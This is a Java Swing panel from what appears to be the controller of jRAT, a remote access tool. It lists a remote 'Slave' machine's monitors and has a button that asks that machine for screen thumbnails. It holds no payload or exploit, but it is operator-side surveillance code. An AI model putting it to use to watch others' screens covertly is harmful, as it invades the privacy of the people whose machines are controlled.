package jrat.controller.ui.panels;

import graphslib.monitors.MonitorListener;
import graphslib.monitors.PanelMonitors;
import graphslib.monitors.PanelMonitors.PanelMonitor;
import graphslib.monitors.RemoteMonitor;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet75AllThumbnails;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

@SuppressWarnings("serial")
public class PanelControlMonitors extends PanelControlParent {
	
	private PanelMonitors panelMonitors;
	private JLabel lblXY;
	private JLabel lblWidthHeight;
	private JButton btnThumbnails;
	
	public PanelControlMonitors(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		
		JToolBar toolBar = new JToolBar();
		toolBar.setFloatable(false);
		
		btnThumbnails = new JButton("Thumbnails");
		btnThumbnails.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				slave.addToSendQueue(new Packet75AllThumbnails());
				btnThumbnails.setText("Reload");
			}
		});
		toolBar.add(btnThumbnails);
		
		lblXY = new JLabel("X, Y: ");
		toolBar.add(lblXY);
		
		lblWidthHeight = new JLabel("Width, Height:");
		toolBar.add(lblWidthHeight);
		
		panelMonitors = new PanelMonitors(sl.getMonitors(), false);
		
		panelMonitors.addListener(new MonitorListener() {
			@Override
			public void onMonitorChange(RemoteMonitor monitor) {						
				PanelMonitor panel = null;
				
				for (PanelMonitor panel1 : panelMonitors.getPanels()) {
					if (panel1.getMonitor().equals(monitor)) {
						panel = panel1;
						break;
					}
				}
				
				if (panel != null) {
					lblXY.setText("X, Y: " + panel.getMonitor().getX() + ", " + panel.getMonitor().getY() + "     ");
					lblWidthHeight.setText("Width, Height: " + panel.getMonitor().getWidth() + ", " + panel.getMonitor().getHeight());
				}
			}
		});
		
		
		scrollPane.setViewportView(panelMonitors);
		setLayout(new BorderLayout(0, 0));
		
		add(toolBar, BorderLayout.SOUTH);
		add(scrollPane);
		
		panelMonitors.reload();
	}
	
	public PanelMonitors getPanelMonitors() {
		return panelMonitors;
	}
}
